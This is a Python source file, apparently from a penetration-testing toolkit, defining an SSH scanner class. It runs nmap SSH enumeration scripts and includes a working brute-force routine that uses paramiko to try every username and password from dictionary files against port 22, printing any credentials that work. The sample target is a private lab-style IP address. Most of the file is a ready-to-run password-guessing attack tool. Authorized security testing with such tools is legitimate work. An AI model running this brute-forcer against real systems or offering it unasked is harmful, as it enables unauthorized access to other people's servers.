import paramiko
from termcolor import cprint
from ProtScan.MyNmap import *
import os

class SshScan:

    def __init__(self, src):
        self.src = src
        self.port = 22
        self.resdir = f"scanresult/{self.src}/ssh/"
        if not os.path.exists(self.resdir):
            os.makedirs(self.resdir)

    def ScriptScan(self):
        cprint("\n[I] Запуск других скриптов nmap", "magenta")
        script = "ssh-hostkey,ssh-publickey-acceptance,ssh-auth-methods"
        if StartScan(self.src,self.port,script,f"{self.resdir}scriptres.xml") != False:
            ParseXML(f"{self.resdir}scriptres.xml")

    def SshBrute(self):
        cprint("\n[I] Начало перебора учетных данных к серверу SSH", "magenta")
        with open(os.path.join("dict","user-test.txt"), 'r') as file:
            userlist = [line.strip() for line in file]
        with open(os.path.join("dict","password-test.txt"), 'r') as file:
            passlist = [line.strip() for line in file]       
        ssh = paramiko.SSHClient()
        ssh.load_system_host_keys()
        ssh.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy())
        for user in userlist:
            for passwd in passlist:
                try:
                    ssh.connect(self.src , port=22, username=user, password=passwd)
                    cprint(f"[+] Успешный вход с данными: {user} {passwd}", "green")
                    ssh.close()
                    return True
                except paramiko.AuthenticationException:
                    ssh.close()
                    continue
                except paramiko.ssh_exception.NoValidConnectionsError:
                    cprint("[!] Не удалось установить подключение", "yellow")
                    return False
                except:
                    cprint("[!] Ошибка в чтении ssh банера", "yellow")
                    continue
        ssh.close()
        print("[-] Не удалось подобрать учетные данные")
        return False
   
if __name__ == "__main__":
    SS = SshScan("10.10.219.90")
    SS.ScriptScan()